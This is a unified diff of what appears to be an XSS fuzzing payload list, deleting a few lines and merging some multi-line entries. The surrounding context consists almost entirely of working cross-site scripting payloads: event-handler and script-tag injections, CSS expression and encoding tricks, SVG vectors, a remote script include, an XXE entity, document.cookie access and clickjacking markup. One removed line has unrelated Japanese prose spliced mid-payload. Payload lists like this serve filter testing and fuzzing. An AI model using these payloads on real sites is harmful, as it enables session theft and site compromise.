@@ -68,7 +68,6 @@ ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
 <A HREF="http://ha.ckers.org@google">XSS</A>
 "><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
 <A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
-<? echo('<SCR)';
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
 <a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
 &lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
@@ -302,7 +301,6 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <img src onerror /" '"= alt=javascript:alert(1)//">
 <IMG SRC=x onkeyup="alert(String.fromCharCode(88,83,83))">
 ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
-
 <font style='color:expression(alert(document.cookie))'>
 <script src=http://yoursite.com/your_files.js></script>
 <img src=x\x12onerror="javascript:alert(1)">
@@ -416,7 +414,6 @@ ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
 ¼script¾alert(¢XSS¢)¼/script¾
-c="javascript:";
 <img \x39src=x onerror="javascript:alert(1)">
 <form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
 <IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
@@ -626,7 +623,6 @@ Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
 <META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";
 exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
 <IMG SRC=x onseeking="alert(String.fromCharCode(88,83,83))">
-&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
 "></iframe><script>alert(123)</script>
 ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
 `"'><img src=xxx:x \x27onerror=javascript:alert(1)>
@@ -1237,7 +1233,6 @@ ABC<div style="x:\x20expression(javascript:alert(1)">DEF
 <style><img src='</style><img src=x onerror=alert("XSS")//'>
 1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
 <IMG LOWSRC=\"javascript:alert('XSS')\">
-EMBED SRC="http://ha.ckers。XSS を含む Flash 動画を埋め込むことができる EMBED タグの使用。ここをクリックしてデモを開始します。allowScriptAccess="never" 属性および allownetworking="internal" 属性を追加すると、このリスクが軽減されます (この情報について Jonathan Vanasco に謝意を表します)。org/xss.swf" AllowScriptAccess="always"></EMBED>
 <iframe/onreadystatechange=alert(1)
 //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
 <meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
@@ -1332,10 +1327,7 @@ d="alert('XSS');\")";
 <div id="xss" style="float:left" onfocus="alert(1)">
 <style>@keyframes x{}</style>
 <div style="animation-name:x" onanimationstart="alert(1)"></div>
-<style>
-div {width: 100px;}
-div:target {width: 200px;}
-</style>
+<style>div {width: 100px;}div:target {width: 200px;}</style>
 <div id="xss" onwebkittransitionend="alert(1)" style="-webkit-transition: width .1s;"></div>
 <div style="overflow:-webkit-marquee" onscroll="alert(1)"></div><details open ontoggle="alert(1)"><video src onratechange="alert(1)"><frameset onload=alert(1)><table background="javascript:alert(1)"></table><!--<img src="--><img src=x onerror=alert(1)//"><comment><img src="</comment><img src=x onerror=alert(1)//"><!-- up to Opera 11.52, FF 3.6.28 -->
 <![><img src="]><img src=x onerror=alert(1)//">
@@ -1373,12 +1365,9 @@ div:target {width: 200px;}
 <script>with(document.getElementById("d"))innerHTML=innerHTML</script>XXX<style>
 <animation xlink:href="javascript:alert(1)"/>
 <animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/>
-
 <image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'%3E%3C/svg%3E"/>
-
 <foreignObject xlink:href="javascript:alert(1)"/>
 <foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(1)%3C/script%3E"/>
-
 </svg><svg xmlns="http://www.w3.org/2000/svg">
 <set attributeName="onmouseover" to="alert(1)"/>
 <animate attributeName="onunload" to="alert(1)"/>
@@ -1413,10 +1402,6 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3
 <handler id="y">alert(1)</handler>
 </svg><svg><style>&lt;img/src=x onerror=alert(1)// </b><svg>
 <image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(1)</script></svg>")'>
-<!--
-Same effect with
-<image filter='...'>
--->
 </svg><!doctype html>
 <form><label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label><br><input name="secret" type="password"></form>
 <!-- injection --><svg height="50px">
@@ -1426,9 +1411,7 @@ Same effect with
 <circle r="400"></circle>
 <animate attributeName="xlink:href" begin="0" from="javascript:alert(1)" to="&" />
 </a><svg><script>
-alert&DiacriticalGrave;1&DiacriticalGrave;
-<p>
-
+alert&DiacriticalGrave;1&DiacriticalGrave;<p>
 <svg><script>
 alert&grave;1&grave;
 <p><?xml-stylesheet href="javascript:alert(1)"?><root/><script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y><?xml version="1.0"?>
@@ -1452,8 +1435,6 @@ alert&grave;1&grave;
 <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=alert(1)&gt;"><a href="http://attacker.org">
 	<iframe src="http://example.org/"></iframe>
 </a><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
-	<h1>Drop me</h1>
-</div>
 <iframe src="http://www.example.org/dropHere.html"></iframe><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
 <body><a href="#" onclick="makePopups()">Spam</a><html xmlns="http://www.w3.org/1999/xhtml"xmlns:svg="http://www.w3.org/2000/svg"><body style="background:gray"><iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
 <svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body></html><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe><span class=foo>Some text</span><a class=bar href="http://www.example.org">www.example.org</a>
